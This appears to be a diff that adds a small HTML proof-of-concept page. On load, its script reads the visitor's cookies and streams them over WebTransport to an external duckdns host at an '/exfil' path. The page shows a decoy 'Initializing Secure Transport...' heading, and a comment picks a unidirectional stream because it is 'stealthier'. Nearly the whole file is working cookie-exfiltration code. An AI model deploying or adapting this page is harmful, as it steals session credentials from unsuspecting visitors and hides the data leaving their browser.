@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>WebTransport PoC</title>
+</head>
+<body>
+    <h1>Initializing Secure Transport...</h1>
+    <script>
+        async function runExfil() {
+            // Your GCE domain
+            const url = '[https://webrtc-poc.duckdns.org/exfil](https://webrtc-poc.duckdns.org/exfil)';
+            
+            try {
+                // 1. Initialize the WebTransport session
+                const transport = new WebTransport(url);
+                console.log("> [1] Connecting to HTTP/3 Server...");
+                
+                // 2. Wait for the connection to be ready
+                await transport.ready;
+                console.log("> [2] WebTransport Session Established");
+
+                // 3. Open a "Send Stream" (unidirectional is stealthier)
+                const stream = await transport.createUnidirectionalStream();
+                const writer = stream.getWriter();
+
+                // 4. Exfiltrate the cargo
+                const data = "user_auth=" + (document.cookie || "SESSION_EXPIRED_OR_EMPTY");
+                const encoded = new TextEncoder().encode(data);
+                
+                await writer.write(encoded);
+                await writer.close();
+                
+                console.log("> [3] Data transmitted via QUIC stream.");
+            } catch (e) {
+                console.error("WebTransport Error:", e);
+            }
+        }
+
+        // Trigger on page load
+        runExfil();
+    </script>
+</body>
+</html>
